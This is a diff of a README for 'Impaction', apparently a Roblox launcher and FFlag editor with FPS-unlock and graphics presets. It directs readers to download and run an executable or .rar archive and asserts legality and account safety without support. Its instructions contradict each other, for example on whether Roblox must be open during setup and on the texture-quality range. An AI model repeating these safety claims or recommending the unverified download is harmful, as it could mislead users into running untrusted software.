@@ -1,104 +1,190 @@
-# Impaction - Simple launcher for Roblox
+# Impaction - Roblox Launcher
 
-<div align="center">
+**Advanced Roblox Launcher with Dark Mode FFlag Editor**
 
-![Impaction Logo](icon.png)
-
-**A powerful, legal FFlag editor client for Roblox**
-
-[![Download](https://img.shields.io/badge/Download-Impact.exe-00cc66?style=for-the-badge&logo=windows)](Impact.exe)
-[![GitHub](https://img.shields.io/badge/Source_Code-Impact.rar-111111?style=for-the-badge&logo=github)](Impact.rar)
-[![Discord](https://img.shields.io/badge/Join_Discord-Community-5865F2?style=for-the-badge&logo=discord)](https://discord.com/invite/pd3HVS5QKm)
-
-[![Legal](https://img.shields.io/badge/100%25-Legal-00cc66?style=flat-square)](README.md)
-[![Open Source](https://img.shields.io/badge/Open-Source-111111?style=flat-square)](README.md)
-[![Windows](https://img.shields.io/badge/Platform-Windows_10/11-0078d6?style=flat-square&logo=windows)](README.md)
-
-</div>
+**Download:** `download/Impaction.rar`
 
 ## 📋 About
+Impaction is a comprehensive Roblox launcher with dark mode interface that provides advanced FFlag editing capabilities for performance optimization and visual customization while maintaining full compliance with Roblox's Terms of Service.
 
-Impaction is a professional FFlag editor client for Roblox that allows you to modify and customize your game experience within Roblox's Terms of Service. Unlike exploit tools, Impaction operates completely legally and transparently.
-
-**Main Developer:** [Yhujin](https://www.youtube.com/@yhujinism)
+## 📁 File Locations
+**Main Application:** `download/Impaction.rar` (Extract to use)
 
 ## ✨ Features
 
-### ✅ 100% Legal
-- Operates within Roblox's Terms of Service
-- No exploits or cheating mechanisms
-- Legitimate client modification only
+### 🎮 Performance Optimization
+- FPS unlocking capabilities
+- Graphics rendering optimization
+- Memory usage optimization
+- Render resolution control
 
-### 🔓 Open Source
-- Full transparency with public source code
-- Community-driven development
-- Regular updates and improvements
+### 🎨 Visual Customization
+- Player name display controls
+- Motion effect adjustments
+- Texture quality management
+- Anti-aliasing configuration
+- Rendering mode selection
 
-### 🤝 Active Community
-- Get support and share configurations
-- Stay updated with latest features
+### ⚙️ Advanced Settings
+- Real-time FFlag application
+- Setting export/import
+- Quick configuration presets
+- Clear setting descriptions
 
-### 🚀 Easy to Use
-- Simple installation process
-- Intuitive user interface
-- No technical knowledge required
+### 🖥️ User Interface
+- Modern dark theme design
+- Intuitive control layout
+- Real-time preview options
+- Simple navigation
 
-## 📥 Download
+## 📥 Installation & Setup
 
-### Direct Downloads:
-- **[Impact.exe](Impact.exe)** - Ready-to-use executable (≈1 MB)
-- **[Impact.rar](Impact.rar)** - Complete source code archive
+### Installation Steps:
+1. **Extract** the `Impaction.rar` file from download folder
+2. **Run** the Impaction application
+3. **Configure** your Roblox installation path
+4. **Apply** desired FFlag settings
+5. **Launch** Roblox with optimized settings
 
 ### System Requirements:
-- **OS:** Windows 10 or 11
-- **Storage:** 1 MB (client) + additional space for configurations
-- **Permissions:** Standard user permissions
+- **OS:** Windows 10/11 (64-bit)
+- **RAM:** 4GB minimum
+- **Storage:** 50MB free space
+- **Roblox:** Latest version installed
 
-## 🚀 Installation Guide
+## 🚀 Getting Started
 
-### Quick Installation:
-1. **Download** the `Impact.exe` file
-2. **Run** the executable
-3. **Start** editing FFlags immediately
+### First Launch Configuration:
+1. **Open Impaction** from extracted folder
+2. **Navigate to Settings** tab
+3. **Configure Roblox Path** (auto-detected)
+4. **Choose configuration preset**
+5. **Apply settings and launch**
 
-### From Source Code:
-1. **Download** the `Impact.rar` archive
-2. **Extract** the files using WinRAR or 7-Zip
-3. **Compile** the source code (if needed)
-4. **Run** the compiled application
+### Game Launch Process:
+1. Select game from library or enter Game ID
+2. Choose configuration preset
+3. Review FFlag settings
+4. Click "Launch Roblox"
+5. Game starts with applied optimizations
 
-## ⚙️ Setup & Configuration
+## ⚙️ Detailed Settings Menu
 
-### Important Setup Instructions:
-Before using Impaction, follow these steps carefully:
+### Performance Settings:
 
-1. **Run Impaction**: Open the Impaction client
-1. **Setup Configuration**: 
-   - Click the **"Setup"** button in Impaction
-   - This will configure FFlag settings for your Roblox session
-   - Wait for confirmation message
-3. **Open Roblox**: To see the results of the config you have installed
+#### **UnCap (FPS Unlocker)**
+Unlock the frame rate limit to achieve smoother gameplay
+- **Option:** 9999 FPS maximum
+- **Effect:** Removes 60 FPS cap
+- **Recommended:** For high refresh rate monitors
 
-### ⚠️ Critical Note:
-**You MUST have Roblox open and running before pressing the "Setup" button.** The setup process needs to connect to your active Roblox session to properly configure FFlags. If Roblox is not running, the setup will fail.
+#### **Graphics Optimization Mode**
+Determine the engine strategy for rendering graphics
+- **Options:** Performance, Balanced, Quality
+- **Performance:** Maximum FPS, lower quality
+- **Quality:** Best visuals, lower FPS
+- **Balanced:** Optimal mix of both
 
-## 🖥️ Screenshot
+#### **Rendering Mode**
+Select graphics API for rendering
+- **Options:** DirectX11, Vulkan, OpenGL
+- **DirectX11:** Best compatibility
+- **Vulkan:** Better performance on supported systems
+- **OpenGL:** Alternative for older systems
 
-![Impaction Interface](client.png)
+#### **Render Resolution Cap**
+Sets the maximum total render pixel limit
+- **Options:** 144p, 240p, 360p, 480p, 720p, 1080p, 1440p, 4K
+- **Lower resolutions:** Better performance
+- **Higher resolutions:** Better visual clarity
 
-## 🛠️ Usage
+### Visual Settings:
 
-2. **Run** Impaction client
-3. **Press "Setup"** button to configure FFlags
-4. Navigate through the intuitive interface
-5. Modify FFlags according to your preferences
-6. Save configurations for future use
+#### **Reduced Motion**
+Reduce certain animations and motion effects in the game
+- **Options:** true, false
+- **true:** Minimal animations, better performance
+- **false:** Full visual effects
 
-## 📖 Documentation
+#### **Player Name**
+Control display of player names in-game
+- **Options:** true, false
+- **true:** Show all player names
+- **false:** Hide player names (improves visibility)
 
-### Basic Commands:
-```bash
-# Run Impaction client
-./Impact.exe
+#### **Anti Aliasing Quality (MSAA)**
+Smooth the edges of 3D objects for better visual quality
+- **Options:** 0 (Off), 1 (Low), 2 (Medium), 4 (High), 8 (Ultra)
+- **Higher values:** Smoother edges, more GPU usage
+- **Lower values:** Better performance
 
-# Important: Always have Roblox running before setup!
+#### **Texture Quality**
+Lock Roblox texture quality at a certain level
+- **Options:** 0-3 (0 = Lowest, 3 = Highest)
+- **0:** Lowest quality, best performance
+- **10:** Highest quality, most GPU usage
+
+## 🔧 Usage Guide
+
+### Applying Settings:
+1. Choose a configuration preset
+3. Click **Run**
+4. Click **Connect**
+
+### Quick Presets:
+
+#### **High End Config** (For powerful PCs):
+- **UnCap:** 9999 FPS
+- **Graphics Optimization Mode:** Quality
+- **Rendering Mode:** DirectX11
+- **Anti Aliasing:** 4 (High)
+- **Texture Quality:** 10 (Highest)
+- **Reduced Motion:** false
+- **Player Name:** true
+- **Render Resolution Cap:** 1440p or 4K
+
+#### **Low End Config** (For older/weaker PCs):
+- **UnCap:** 9999 FPS
+- **Graphics Optimization Mode:** Performance
+- **Rendering Mode:** DirectX11
+- **Anti Aliasing:** 0 (Off)
+- **Texture Quality:** 0 (Lowest)
+- **Reduced Motion:** true
+- **Player Name:** false
+- **Render Resolution Cap:** 720p
+
+## 🔒 Compatibility
+
+### Legal Compliance:
+- ✅ Only modifies allowed FFlags
+- ✅ No game file modification
+- ✅ Respects Roblox ToS
+- ✅ Safe for account usage
+
+## 🛠️ Troubleshooting
+
+### Common Issues:
+1. **Settings not applying:** Ensure Roblox is closed when applying FFlags
+2. **Game crashes:** Try Low End Config or reset to defaults
+3. **FPS still capped:** Verify UnCap is set to "9999"
+4. **Visual glitches:** Try different Rendering Mode
+
+### Quick Fixes:
+- **Switch to Low End Config** for stability
+- **Change Rendering Mode** to DirectX11
+- **Lower Render Resolution** for better performance
+- **Close other applications** while gaming
+
+## 🔄 Updates
+Check regularly for:
+- New FFlag options
+- Performance improvements
+- Bug fixes
+- Compatibility updates
+
+## ❓ Support
+For assistance:
+1. Try Low End Config first
+2. Check system requirements
+3. Ensure Roblox is updated
+4. Extract fresh copy from `download/Impaction.rar`
